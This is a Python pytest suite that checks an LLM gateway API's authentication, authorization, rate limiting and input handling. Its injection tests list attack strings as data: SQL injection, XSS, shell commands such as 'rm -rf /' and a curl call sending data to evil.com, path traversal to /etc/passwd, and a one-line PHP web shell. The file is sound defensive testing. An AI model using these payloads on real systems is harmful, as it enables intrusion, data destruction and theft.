"""
Comprehensive cybersecurity tests for LLM Gateway
"""
import pytest
import hashlib
import secrets
from unittest.mock import patch
from httpx import AsyncClient
from sqlalchemy import text


class TestAuthenticationSecurity:
    """Test authentication security measures"""
    
    async def test_password_hashing_security(self):
        """Test that passwords are properly hashed"""
        from auth.jwt_handler import get_password_hash, verify_password
        
        password = "test_password_123"
        hashed = get_password_hash(password)
        
        # Hash should not contain original password
        assert password not in hashed
        
        # Hash should be different each time (salt)
        hashed2 = get_password_hash(password)
        assert hashed != hashed2
        
        # But both should verify correctly
        assert verify_password(password, hashed)
        assert verify_password(password, hashed2)
        
        # Wrong password should fail
        assert not verify_password("wrong_password", hashed)
    
    async def test_jwt_token_security(self):
        """Test JWT token security"""
        from auth.jwt_handler import create_access_token, verify_token
        
        # Create token
        payload = {"sub": "user123", "role": "admin"}
        token = create_access_token(payload)
        
        # Token should not contain plain payload
        assert "user123" not in token
        assert "admin" not in token
        
        # Verify token
        decoded = verify_token(token)
        assert decoded["sub"] == "user123"
        assert decoded["type"] == "access"
        
        # Invalid token should fail
        invalid_decoded = verify_token("invalid_token")
        assert invalid_decoded is None
    
    async def test_api_key_security(self):
        """Test API key security"""
        from auth.jwt_handler import decode_api_key
        
        # Generate secure API key
        key_bytes = secrets.token_bytes(32)
        key_string = key_bytes.hex()
        full_key = f"llm_{key_string}"
        
        # Key should be random and long
        assert len(key_string) == 64  # 32 bytes = 64 hex chars
        
        # Decode should work
        decoded = decode_api_key(full_key)
        assert decoded == key_string
        
        # Invalid format should fail
        assert decode_api_key("invalid_key") is None
        assert decode_api_key("wrongprefix_" + key_string) is None
    
    async def test_session_security(self, client: AsyncClient, test_user):
        """Test session security measures"""
        # Login
        response = await client.post("/api/auth/login", data={
            "username": test_user.email,
            "password": "testpassword123"
        })
        
        assert response.status_code == 200
        token_data = response.json()
        
        # Access token should expire (short-lived)
        access_token = token_data["access_token"]
        refresh_token = token_data["refresh_token"]
        
        # Tokens should be different
        assert access_token != refresh_token
        
        # Should be able to access protected endpoint
        response = await client.get(
            "/api/auth/me",
            headers={"Authorization": f"Bearer {access_token}"}
        )
        assert response.status_code == 200


class TestInputValidationSecurity:
    """Test input validation and sanitization"""
    
    async def test_sql_injection_protection(self, client: AsyncClient, test_api_key):
        """Test SQL injection attack prevention"""
        api_key_obj, api_key_string = test_api_key
        
        # Attempt SQL injection in prompt
        malicious_prompts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
            "' UNION SELECT password FROM users WHERE '1'='1",
            "\"; DELETE FROM organizations; --"
        ]
        
        for prompt in malicious_prompts:
            with patch('api.routers.llm.gateway.generate_text') as mock_generate:
                mock_generate.return_value.content = "Safe response"
                mock_generate.return_value.cost = 0.001
                
                response = await client.post(
                    "/api/v1/generate",
                    headers={"Authorization": f"Bearer {api_key_string}"},
                    json={"prompt": prompt, "model": "balanced"}
                )
                
                # Should not crash or expose database errors
                assert response.status_code in [200, 400, 422]
                if response.status_code != 200:
                    # Error should not reveal database structure
                    error_detail = response.json().get("detail", "").lower()
                    assert "sql" not in error_detail
                    assert "database" not in error_detail
                    assert "table" not in error_detail
    
    async def test_xss_protection(self, client: AsyncClient, test_user):
        """Test XSS attack prevention"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<iframe src='javascript:alert(`xss`)'></iframe>"
        ]
        
        # Test registration with malicious input
        for payload in xss_payloads:
            response = await client.post("/api/auth/register", json={
                "email": f"test{secrets.token_hex(4)}@example.com",
                "full_name": payload,  # Malicious input
                "password": "password123",
                "organization_name": "Test Org"
            })
            
            # Should either reject or sanitize
            if response.status_code == 200:
                # If accepted, should be sanitized
                user_data = await client.get(
                    "/api/auth/me",
                    headers={"Authorization": f"Bearer {response.json()['access_token']}"}
                )
                assert "<script>" not in user_data.json()["full_name"]
    
    async def test_command_injection_protection(self, client: AsyncClient, test_api_key):
        """Test command injection prevention"""
        api_key_obj, api_key_string = test_api_key
        
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`cat /etc/shadow`",
            "$(whoami)",
            "; curl http://evil.com/steal_data",
            "&& python -c \"import os; os.system('rm -rf /')\""
        ]
        
        for payload in command_injection_payloads:
            with patch('api.routers.llm.gateway.generate_text') as mock_generate:
                mock_generate.return_value.content = "Safe response"
                mock_generate.return_value.cost = 0.001
                
                response = await client.post(
                    "/api/v1/generate",
                    headers={"Authorization": f"Bearer {api_key_string}"},
                    json={"prompt": payload, "model": "balanced"}
                )
                
                # Should handle safely without executing commands
                assert response.status_code in [200, 400, 422]
    
    async def test_path_traversal_protection(self, client: AsyncClient):
        """Test path traversal attack prevention"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test various endpoints that might handle file paths
            response = await client.get(f"/static/{payload}")
            
            # Should not expose system files
            assert response.status_code in [404, 403, 400]
            if response.status_code == 200:
                content = response.text.lower()
                assert "root:" not in content
                assert "daemon:" not in content


class TestAuthorizationSecurity:
    """Test authorization and access control"""
    
    async def test_unauthorized_access_prevention(self, client: AsyncClient):
        """Test that unauthorized requests are blocked"""
        protected_endpoints = [
            ("/api/auth/me", "GET"),
            ("/api/auth/api-keys", "GET"),
            ("/api/auth/api-keys", "POST"),
            ("/api/dashboard/analytics", "GET"),
            ("/api/billing/usage", "GET"),
            ("/api/v1/generate", "POST"),
            ("/api/admin/stats", "GET")
        ]
        
        for endpoint, method in protected_endpoints:
            if method == "GET":
                response = await client.get(endpoint)
            elif method == "POST":
                response = await client.post(endpoint, json={})
            
            # Should require authentication
            assert response.status_code == 401
    
    async def test_role_based_access_control(self, client: AsyncClient, test_organization):
        """Test role-based access control"""
        from models.user import User, UserRole
        from auth.jwt_handler import get_password_hash, create_access_token
        
        # Create users with different roles
        viewer_user = User(
            email="viewer@example.com",
            full_name="Viewer User",
            hashed_password=get_password_hash("password123"),
            organization_id=test_organization.id,
            role=UserRole.VIEWER,
            is_active=True,
            is_verified=True
        )
        
        admin_user = User(
            email="admin@example.com",
            full_name="Admin User",
            hashed_password=get_password_hash("password123"),
            organization_id=test_organization.id,
            role=UserRole.ADMIN,
            is_active=True,
            is_verified=True
        )
        
        # Test viewer cannot access admin endpoints
        viewer_token = create_access_token({"sub": str(viewer_user.id)})
        response = await client.get(
            "/api/admin/stats",
            headers={"Authorization": f"Bearer {viewer_token}"}
        )
        assert response.status_code == 403
        
        # Test admin can access admin endpoints
        admin_token = create_access_token({"sub": str(admin_user.id)})
        with patch('auth.dependencies.get_current_user') as mock_user:
            mock_user.return_value = admin_user
            
            response = await client.get(
                "/api/admin/stats",
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            # Might be 200 or 404, but not 403
            assert response.status_code != 403
    
    async def test_organization_isolation(self, client: AsyncClient, db_session):
        """Test that organizations cannot access each other's data"""
        from models.user import Organization, User, APIKey, UserRole
        from auth.jwt_handler import get_password_hash
        
        # Create second organization
        org2 = Organization(
            name="Other Organization",
            slug="other-org",
            monthly_request_limit=1000,
            monthly_token_limit=50000
        )
        db_session.add(org2)
        await db_session.flush()
        
        # Create user in second organization
        user2 = User(
            email="user2@example.com",
            full_name="User Two",
            hashed_password=get_password_hash("password123"),
            organization_id=org2.id,
            role=UserRole.OWNER,
            is_active=True,
            is_verified=True
        )
        db_session.add(user2)
        await db_session.flush()
        
        # Create API key for second organization
        key_string = secrets.token_hex(32)
        key_hash = hashlib.sha256(key_string.encode()).hexdigest()
        
        api_key2 = APIKey(
            name="Other Org Key",
            key_hash=key_hash,
            key_prefix=f"llm_...{key_string[-8:]}",
            user_id=user2.id,
            organization_id=org2.id
        )
        db_session.add(api_key2)
        await db_session.commit()
        
        # User from org2 should not see org1 data
        from auth.jwt_handler import create_access_token
        user2_token = create_access_token({"sub": str(user2.id)})
        
        with patch('auth.dependencies.get_current_user') as mock_user:
            mock_user.return_value = user2
            
            response = await client.get(
                "/api/dashboard/analytics",
                headers={"Authorization": f"Bearer {user2_token}"}
            )
            
            # Should only see their own organization's data
            assert response.status_code == 200
            data = response.json()
            # Data should be empty or only contain org2 data


class TestRateLimitingSecurity:
    """Test rate limiting security"""
    
    async def test_rate_limit_enforcement(self, client: AsyncClient, test_api_key):
        """Test that rate limits are enforced"""
        api_key_obj, api_key_string = test_api_key
        
        # Set very low rate limit for testing
        api_key_obj.rate_limit_per_minute = 2
        
        # Mock Redis operations
        with patch('auth.dependencies.redis_client') as mock_redis:
            # First two requests should succeed
            mock_redis.get.side_effect = [0, 1, 2]  # Progressive count
            
            for i in range(2):
                with patch('api.routers.llm.gateway.generate_text'):
                    response = await client.post(
                        "/api/v1/generate",
                        headers={"Authorization": f"Bearer {api_key_string}"},
                        json={"prompt": f"Test {i}", "model": "balanced"}
                    )
                    assert response.status_code == 200
            
            # Third request should be rate limited
            mock_redis.get.return_value = 3  # Exceeded limit
            response = await client.post(
                "/api/v1/generate",
                headers={"Authorization": f"Bearer {api_key_string}"},
                json={"prompt": "Test rate limit", "model": "balanced"}
            )
            assert response.status_code == 429
            assert "rate limit" in response.json()["detail"].lower()
    
    async def test_rate_limit_bypass_prevention(self, client: AsyncClient, test_api_key):
        """Test that rate limits cannot be bypassed"""
        api_key_obj, api_key_string = test_api_key
        
        # Try various bypass techniques
        bypass_attempts = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "10.0.0.1"},
            {"User-Agent": "Different-Agent"},
            {"X-Rate-Limit-Bypass": "true"},
            {"Authorization": f"Bearer {api_key_string}", "X-API-Key": api_key_string}
        ]
        
        with patch('auth.dependencies.redis_client') as mock_redis:
            mock_redis.get.return_value = 999  # Always over limit
            
            for headers in bypass_attempts:
                headers["Authorization"] = f"Bearer {api_key_string}"
                
                response = await client.post(
                    "/api/v1/generate",
                    headers=headers,
                    json={"prompt": "Bypass attempt", "model": "balanced"}
                )
                
                # Should still be rate limited
                assert response.status_code == 429


class TestDataProtectionSecurity:
    """Test data protection and encryption"""
    
    async def test_sensitive_data_not_logged(self, client: AsyncClient, test_user):
        """Test that sensitive data is not logged"""
        import logging
        from io import StringIO
        
        # Capture logs
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        logger = logging.getLogger()
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)
        
        try:
            # Login with password
            response = await client.post("/api/auth/login", data={
                "username": test_user.email,
                "password": "testpassword123"
            })
            
            log_contents = log_stream.getvalue()
            
            # Password should not appear in logs
            assert "testpassword123" not in log_contents
            
            # API keys should not appear in logs
            if response.status_code == 200:
                token = response.json()["access_token"]
                assert token not in log_contents
                
        finally:
            logger.removeHandler(handler)
    
    async def test_error_message_sanitization(self, client: AsyncClient):
        """Test that error messages don't leak sensitive information"""
        # Test with invalid data to trigger errors
        response = await client.post("/api/auth/login", data={
            "username": "invalid@example.com",
            "password": "wrongpassword"
        })
        
        assert response.status_code == 401
        error_detail = response.json()["detail"]
        
        # Should not reveal specific database errors
        sensitive_terms = [
            "database", "sql", "connection", "table", "column",
            "password hash", "bcrypt", "sha256", "user_id"
        ]
        
        for term in sensitive_terms:
            assert term not in error_detail.lower()
    
    async def test_cors_security(self, client: AsyncClient):
        """Test CORS security configuration"""
        # Test preflight request
        response = await client.options(
            "/api/auth/login",
            headers={
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
        )
        
        # Should either reject evil origin or not include it in allowed origins
        if "Access-Control-Allow-Origin" in response.headers:
            allowed_origin = response.headers["Access-Control-Allow-Origin"]
            assert allowed_origin != "https://evil.com"
    
    async def test_secure_headers(self, client: AsyncClient):
        """Test security headers are present"""
        response = await client.get("/api/health")
        
        # Should have basic security headers
        headers = response.headers
        
        # Content-Type should be set correctly
        assert "application/json" in headers.get("content-type", "")
        
        # Should have request ID for tracking
        assert "X-Request-ID" in headers or "X-Process-Time" in headers


class TestBusinessLogicSecurity:
    """Test business logic security"""
    
    async def test_usage_limit_tampering_prevention(self, client: AsyncClient, test_api_key, test_organization):
        """Test that usage limits cannot be tampered with"""
        api_key_obj, api_key_string = test_api_key
        
        # Set low limit
        test_organization.monthly_request_limit = 1
        
        # Try to bypass with malicious requests
        tamper_attempts = [
            {"usage_override": 0},
            {"reset_usage": True},
            {"organization_id": "different_org"},
            {"admin": True},
            {"limit_bypass": True}
        ]
        
        for tamper_data in tamper_attempts:
            request_json = {
                "prompt": "Test",
                "model": "balanced",
                **tamper_data
            }
            
            with patch('api.routers.llm.gateway.generate_text'):
                response = await client.post(
                    "/api/v1/generate",
                    headers={"Authorization": f"Bearer {api_key_string}"},
                    json=request_json
                )
                
                # Should either ignore tampering or reject request
                # Should not bypass usage limits
                assert response.status_code in [200, 400, 422, 429]
    
    async def test_billing_amount_tampering_prevention(self, authenticated_client: AsyncClient):
        """Test that billing amounts cannot be tampered with"""
        # Try to create subscription with tampered amount
        tamper_attempts = [
            {"plan_type": "enterprise", "custom_price": 1.0},
            {"plan_type": "starter", "discount": 100},
            {"plan_type": "free", "upgrade": "enterprise"},
            {"admin_override": True, "plan_type": "enterprise"}
        ]
        
        for tamper_data in tamper_attempts:
            with patch('stripe.Customer.create'), \
                 patch('stripe.Subscription.create'):
                
                response = await authenticated_client.post(
                    "/api/billing/subscribe",
                    json=tamper_data
                )
                
                # Should either reject or use correct pricing
                if response.status_code == 200:
                    # Verify correct plan pricing is used
                    pass  # Plan validation happens in Stripe
                elif response.status_code == 400:
                    # Properly rejected
                    pass
                else:
                    # Should not result in server error
                    assert response.status_code != 500


class TestInfrastructureSecurity:
    """Test infrastructure security measures"""
    
    async def test_environment_variable_security(self):
        """Test that sensitive environment variables are handled securely"""
        import os
        
        # Test that default values are secure
        jwt_secret = os.getenv("JWT_SECRET_KEY", "default")
        assert jwt_secret != "default"  # Should be overridden
        assert len(jwt_secret) >= 32  # Should be long enough
        
        # Database URL should not contain credentials in code
        db_url = os.getenv("DATABASE_URL", "")
        # Should not have hardcoded credentials
        assert "password123" not in db_url
        assert "admin:admin" not in db_url
    
    async def test_debug_mode_disabled(self, client: AsyncClient):
        """Test that debug mode is disabled in production"""
        # Try to trigger debug information
        response = await client.get("/api/nonexistent")
        
        # Should not reveal stack traces or internal paths
        if response.status_code == 404:
            error_content = response.text.lower()
            assert "traceback" not in error_content
            assert "/users/" not in error_content  # No file paths
            assert "line " not in error_content  # No line numbers
    
    async def test_file_upload_security(self, client: AsyncClient):
        """Test file upload security (if applicable)"""
        # Test malicious file uploads
        malicious_files = [
            ("malware.exe", b"MZ\x90\x00"),  # Executable
            ("script.php", b"<?php system($_GET['cmd']); ?>"),  # PHP script
            ("../../../etc/passwd", b"root:x:0:0:root:/root:/bin/bash"),  # Path traversal
        ]
        
        for filename, content in malicious_files:
            # If the application has file upload endpoints, test them
            # For now, just test that static file serving is secure
            response = await client.get(f"/static/{filename}")
            
            # Should not execute or serve malicious files
            assert response.status_code in [404, 403]
            
            if response.status_code == 200:
                # Should not execute PHP or return executable content
                assert response.headers.get("content-type", "").startswith("text/")
                assert b"<?php" not in response.content